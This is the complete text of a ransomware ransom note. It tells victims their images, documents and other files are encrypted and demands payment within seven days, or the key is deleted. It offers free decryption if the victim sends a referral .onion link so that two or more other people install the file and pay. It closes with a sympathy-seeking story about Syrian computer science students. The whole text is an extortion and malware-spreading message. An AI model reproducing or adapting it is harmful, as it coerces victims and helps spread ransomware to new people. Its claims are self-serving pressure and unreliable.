====================================
Send the link https://3hnuhydu4pd247qb.onion.to/r/User_ID below to other people, if two or more people will install this file and pay, we will decrypt your files for free.


What we did?
============
We had encrypted all of your important images, documents, videos and all other files on your computer. 
We used a very strong encryption algorithm that used by all governments all over the world. 
We store your personal decryption code to your files on our servers and we are the only ones that can decrypt your files. 
Please don't try to be smart, anything other than payment will cause damage to your files and the files will be lost forever!!!
If you will not pay for the next 7 days, the decryption key will be deleted and your files will be lost forever.


Why we do that? 
===============
We are a group of computer science students from Syria, as you probably know Syria is having bad time for the last five years. 
Since 2011 we have more the half million people died and over 5 million refugees. Each member of our team has lost a dear from his family. 
I personally have lost both my parents and my little sister in 2015. 
The sad part is that the world remained silent and no one helping us so we decided to take an action.
